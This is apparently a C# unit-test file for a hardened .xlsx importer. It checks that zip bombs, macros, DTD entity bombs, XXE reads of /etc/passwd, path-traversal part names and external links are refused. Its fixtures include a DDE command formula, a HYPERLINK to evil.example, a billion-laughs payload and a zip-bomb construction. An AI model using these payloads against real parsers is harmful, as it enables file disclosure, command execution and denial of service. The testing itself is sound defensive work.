using System.IO.Compression;
using System.Text;
using Tempest.Calc.Import;

namespace Tempest.Calc.Tests.Import;

/// <summary>The safe .xlsx reader: zip bombs, macros, DTDs and entities, formula cells (cached value only), shapes of real files.</summary>
public sealed class XlsxTests
{
    [Fact]
    public void A_Real_Shaped_Workbook_Is_Read_Cell_By_Cell()
    {
        var book = XlsxReader.Read(Samples.Load("nx/bracket-a.xlsx"));
        var sheet = Assert.Single(book.Sheets);
        Assert.Equal("Expressions", sheet.Name);
        Assert.Equal(10, sheet.Rows.Count);
        Assert.Equal("Name", sheet.At(1, 1)!.Text);
        Assert.Equal(XlsxCellKind.Number, sheet.At(2, 3)!.Kind);
        Assert.Equal("6", sheet.At(2, 3)!.Text);
        Assert.Equal("plate_w*2", sheet.At(7, 2)!.Text);
        Assert.Equal("B7", XlsxReader.ColumnName(2) + "7");
    }

    [Fact]
    public void A_Formula_Cell_Gives_Its_Cached_Value_And_The_Formula_Is_Never_Read()
    {
        // gap_max's value cell is =C2*0.1 with the cached result 0.8; C2 is 6, so evaluating it would give 0.6.
        var book = XlsxReader.Read(Samples.Load("nx/bracket-a.xlsx"));
        var cell = book.Sheets[0].At(6, 3)!;
        Assert.True(cell.IsFormula);
        Assert.Equal("0.8", cell.Text);
        Assert.Equal(1, book.FormulaCellCount);

        // A formula with no cached value is an empty cell that says it is a formula; it is not evaluated into anything.
        var bytes = Samples.Workbook("<row r=\"1\"><c r=\"A1\"><f>1+1</f></c><c r=\"B1\"><f>SUM(A1:A9)</f><v>7</v></c></row>");
        var read = XlsxReader.Read(bytes);
        var a1 = read.Sheets[0].At(1, 1)!;
        Assert.True(a1.IsFormula);
        Assert.Equal(XlsxCellKind.Empty, a1.Kind);
        Assert.Equal(string.Empty, a1.Text);
        Assert.Equal("7", read.Sheets[0].At(1, 2)!.Text);
        Assert.Equal(2, read.FormulaCellCount);
    }

    [Fact]
    public void A_Formula_That_Names_A_File_Or_A_Command_Is_Skipped_Not_Read()
    {
        var evil = "<row r=\"1\"><c r=\"A1\" t=\"str\"><f>HYPERLINK(\"http://evil.example/\"&amp;A2)</f><v>link</v></c><c r=\"B1\"><f>cmd|' /C calc'!A0</f><v>1</v></c></row>";
        var read = XlsxReader.Read(Samples.Workbook(evil));
        Assert.Equal("link", read.Sheets[0].At(1, 1)!.Text);
        Assert.DoesNotContain("evil", string.Concat(read.Sheets[0].Rows.SelectMany(r => r.Cells).Select(c => c.Text)), StringComparison.Ordinal);
    }

    [Fact]
    public void Inline_Strings_Booleans_Errors_And_Rich_Text_Are_Read()
    {
        var sst = "<?xml version=\"1.0\"?><sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><si><r><t>Rich </t></r><r><t>text</t></r><rPh><t>ignored</t></rPh></si></sst>";
        var data = "<row r=\"1\"><c r=\"A1\" t=\"s\"><v>0</v></c><c r=\"B1\" t=\"inlineStr\"><is><t>inline</t></is></c><c r=\"C1\" t=\"b\"><v>1</v></c><c r=\"D1\" t=\"e\"><v>#DIV/0!</v></c><c r=\"E1\" t=\"n\"><v>1E-3</v></c></row>";
        var row = XlsxReader.Read(Samples.Workbook(data, sst)).Sheets[0].Rows[0];
        Assert.Equal("Rich text", row.At(1)!.Text);
        Assert.Equal("inline", row.At(2)!.Text);
        Assert.Equal(XlsxCellKind.Boolean, row.At(3)!.Kind);
        Assert.Equal("true", row.At(3)!.Text);
        Assert.Equal(XlsxCellKind.Error, row.At(4)!.Kind);
        Assert.Equal("1E-3", row.At(5)!.Text);
    }

    [Fact]
    public void A_Zip_Bomb_Is_Refused_Before_Its_Contents_Are_Expanded()
    {
        // 200 MB of zeros deflates to about 200 KB: a 1000:1 ratio, and over the 32 MB per-part cap.
        var bomb = Samples.Zip([("xl/worksheets/sheet1.xml", new byte[200 * 1024 * 1024])]);
        Assert.True(bomb.Length < 1_000_000, "the bomb itself is small: " + bomb.Length);
        Samples.Refuses(ImportRefusalCode.ZipBomb, () => XlsxReader.Read(bomb));
    }

    [Fact]
    public void A_High_Ratio_Part_Under_The_Size_Cap_Is_Refused_By_The_Ratio_Test()
    {
        // 20 MB of zeros: under the 32 MB part cap, over the 1 MB ratio floor, ratio about 1000.
        var bomb = Samples.Zip([("xl/worksheets/sheet1.xml", new byte[20 * 1024 * 1024])]);
        var ex = Samples.Refuses(ImportRefusalCode.ZipBomb, () => XlsxReader.Read(bomb));
        Assert.Contains("fold", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Small_Repetitive_Sheet_Is_Not_Mistaken_For_A_Bomb()
    {
        var rows = string.Concat(Enumerable.Range(1, 600).Select(i => $"<row r=\"{i}\"><c r=\"A{i}\"><v>1</v></c></row>"));
        var book = XlsxReader.Read(Samples.Workbook(rows));
        Assert.Equal(600, book.Sheets[0].Rows.Count);
    }

    [Fact]
    public void An_Archive_Whose_Directory_Understates_A_Part_Is_Stopped_While_Reading()
    {
        var rows = string.Concat(Enumerable.Range(1, 3000).Select(i => $"<row r=\"{i}\"><c r=\"A{i}\"><v>{i}</v></c></row>"));
        var honest = Samples.Workbook(rows);
        var lying = (byte[])honest.Clone();

        // Patch every central-directory entry's uncompressed size (offset 24 from the PK\x01\x02 signature) to 100 bytes.
        var patched = 0;

        for (var i = 0; i < lying.Length - 28; i++)
        {
            if (lying[i] == 0x50 && lying[i + 1] == 0x4B && lying[i + 2] == 0x01 && lying[i + 3] == 0x02)
            {
                BitConverter.GetBytes(100u).CopyTo(lying, i + 24);
                patched++;
            }
        }

        Assert.True(patched >= 5);

        // Either the archive library notices the mismatch (a damaged file) or our counter does (a bomb): never a successful read.
        var ex = Assert.Throws<ImportRefusedException>(() => XlsxReader.Read(lying));
        Assert.True(ex.Code is ImportRefusalCode.ZipBomb or ImportRefusalCode.MalformedStructure, ex.Code.ToString());
    }

    [Fact]
    public void A_Workbook_With_Macros_Is_Refused()
    {
        var withBin = Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>1</v></c></row>", extra: [("xl/vbaProject.bin", [1, 2, 3])]);
        Samples.Refuses(ImportRefusalCode.Macros, () => XlsxReader.Read(withBin));

        var types = "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/></Types>";
        Samples.Refuses(ImportRefusalCode.Macros, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"/>", contentTypes: types)));
    }

    [Fact]
    public void A_Dtd_Or_An_Entity_Is_Never_Expanded_And_Refuses_The_File()
    {
        const string Bomb = "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><si><t>&lol3;</t></si></sst>";
        var ex = Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\" t=\"s\"><v>0</v></c></row>", Bomb)));
        Assert.Contains("DTD", ex.Message, StringComparison.OrdinalIgnoreCase);

        const string External = "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>";
        var xxe = Samples.Workbook("", extra: [("xl/worksheets/sheet1.xml", Encoding.UTF8.GetBytes(External))]);
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(xxe));
    }

    [Fact]
    public void An_External_Workbook_Relationship_Is_Not_Followed()
    {
        var rels = "<?xml version=\"1.0\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"worksheet\" Target=\"file:///etc/passwd\" TargetMode=\"External\"/></Relationships>";
        var bytes = Samples.Workbook("<row r=\"1\"/>", extra: [("xl/_rels/workbook.xml.rels", Encoding.UTF8.GetBytes(rels))]);

        // The only relationship is external, so it is skipped and the sheet has nothing to point at.
        var ex = Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(bytes));
        Assert.Contains("no relationship", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void A_Part_With_A_Traversing_Or_Duplicate_Name_Is_Refused()
    {
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"/>", extra: [("xl/../../evil.xml", [1])])));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"/>", extra: [("/abs.xml", [1])])));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Zip([("xl/workbook.xml", [1]), ("xl/workbook.xml", [2])])));
    }

    [Fact]
    public void Too_Many_Parts_Rows_Columns_Or_Cells_Are_Refused()
    {
        var parts = Enumerable.Range(0, 300).Select(i => ($"xl/extra{i}.xml", new byte[] { 1 })).ToList();
        Samples.Refuses(ImportRefusalCode.ZipBomb, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"/>", extra: parts)));

        var limits = new ImportLimits { MaxRows = 3, MaxColumns = 4, MaxCells = 6 };
        var budget = () => new ImportBudget(limits);
        Samples.Refuses(ImportRefusalCode.TooManyRows, () => XlsxReader.Read(Samples.Workbook(string.Concat(Enumerable.Range(1, 4).Select(i => $"<row r=\"{i}\"/>"))), budget()));
        Samples.Refuses(ImportRefusalCode.TooManyColumns, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"E1\"><v>1</v></c></row>"), budget()));
        Samples.Refuses(ImportRefusalCode.TooManyRows, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>1</v><c r=\"B1\"/></c></row><row r=\"2\"><c r=\"A2\"><v>1</v></c><c r=\"B2\"><v>1</v></c><c r=\"C2\"><v>1</v></c><c r=\"D2\"><v>1</v></c><c r=\"A3\"><v>1</v></c><c r=\"B3\"><v>1</v></c></row>"), budget()));
    }

    [Fact]
    public void A_Single_Cell_Longer_Than_The_Field_Cap_Is_Refused()
    {
        var sst = Samples.Sst(new string('x', 5000));
        Samples.Refuses(ImportRefusalCode.FieldTooLong, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\" t=\"s\"><v>0</v></c></row>", sst)));
    }

    [Fact]
    public void A_Cell_Reference_Out_Of_Range_Or_A_Bad_Shared_String_Index_Is_Refused()
    {
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"ZZZZ1\"><v>1</v></c></row>")));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A0\"><v>1</v></c></row>")));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\" t=\"s\"><v>99</v></c></row>", Samples.Sst("only"))));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>not-a-number</v></c></row>")));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>NaN</v></c></row>")));
        Assert.Null(XlsxReader.ParseReference("A"));
        Assert.Null(XlsxReader.ParseReference("1A"));
        Assert.Equal((27, 5), XlsxReader.ParseReference("AA5"));
    }

    [Fact]
    public void Legacy_Encrypted_And_Non_Zip_Files_Are_Refused_With_A_Reason()
    {
        var ole = new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0, 0, 0 };
        Assert.Contains("old .xls", Samples.Refuses(ImportRefusalCode.Unsupported, () => XlsxReader.Read(ole)).Message, StringComparison.Ordinal);
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read("name,value\n"u8.ToArray()));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read([0x50, 0x4B, 0x03, 0x04, 1, 2, 3]));
        Samples.Refuses(ImportRefusalCode.MalformedStructure, () => XlsxReader.Read(Samples.Zip([("readme.txt", [1])])));
    }

    [Fact]
    public void A_Truncated_Workbook_Is_Refused_Not_Thrown_As_Something_Else()
    {
        var bytes = Samples.BytesOf("solidworks/bracket-design-table.xlsx");

        for (var cut = 0; cut < bytes.Length; cut += 37)
        {
            var truncated = bytes[..cut];
            var ex = Record.Exception(() => XlsxReader.Read(truncated));

            if (ex is not null)
                Assert.IsType<ImportRefusedException>(ex);
        }
    }

    [Fact]
    public void Hidden_Sheets_Are_Flagged_So_They_Are_Not_Picked_By_Default()
    {
        var workbook = "<?xml version=\"1.0\"?><workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><sheets><sheet name=\"Secret\" sheetId=\"1\" state=\"hidden\" r:id=\"rId1\"/></sheets></workbook>";
        var book = XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>1</v></c></row>", workbookXml: workbook));
        Assert.True(book.Sheets[0].Hidden);
    }

    [Fact]
    public void Linked_Workbooks_And_Embedded_Objects_Are_Noted_And_Ignored()
    {
        var book = XlsxReader.Read(Samples.Workbook("<row r=\"1\"><c r=\"A1\"><v>1</v></c></row>", extra: [("xl/externalLinks/externalLink1.xml", [1]), ("xl/embeddings/oleObject1.bin", [1, 2])]));
        Assert.Contains(book.Notices, n => n.Contains("links", StringComparison.Ordinal));
        Assert.Contains(book.Notices, n => n.Contains("embedded", StringComparison.Ordinal));
    }

    [Fact]
    public void Zip_Entry_Compression_Of_A_Real_Sample_Is_Well_Within_The_Ratio()
    {
        using var zip = new ZipArchive(new MemoryStream(Samples.BytesOf("nx/bracket-a.xlsx")));
        Assert.All(zip.Entries, e => Assert.True(e.CompressedLength == 0 || (double)e.Length / e.CompressedLength < 20));
    }
}
